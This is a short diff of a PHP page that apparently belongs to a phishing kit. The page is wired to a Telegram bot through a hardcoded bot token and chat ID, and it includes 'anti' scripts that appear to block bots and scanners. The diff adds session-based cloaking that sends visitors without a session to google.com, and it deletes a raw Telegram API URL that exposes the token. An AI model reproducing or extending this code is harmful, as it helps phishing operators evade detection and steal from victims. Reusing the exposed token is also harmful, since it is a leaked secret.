@@ -1,6 +1,6 @@
 <?php
 session_start();
-
+if (isset($_SESSION["username"])) {
 if(isset($_GET['messageId'])){
 	$botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
 $chatID = "1064643518";
@@ -36,7 +36,6 @@ $responseData = json_decode($response, true);
 
 }
 
-https://api.telegram.org/bot6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk/editMessageText?chat_id=1064643518&message_id=40&text=fghfghfg
 
 include "anti/anti1.php";
 include "anti/anti2.php"; 
@@ -1078,3 +1077,10 @@ border:0;
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 </body></html>
+<?php
+
+}else {
+	HEADER("Location: https://google.com");
+
+}
+
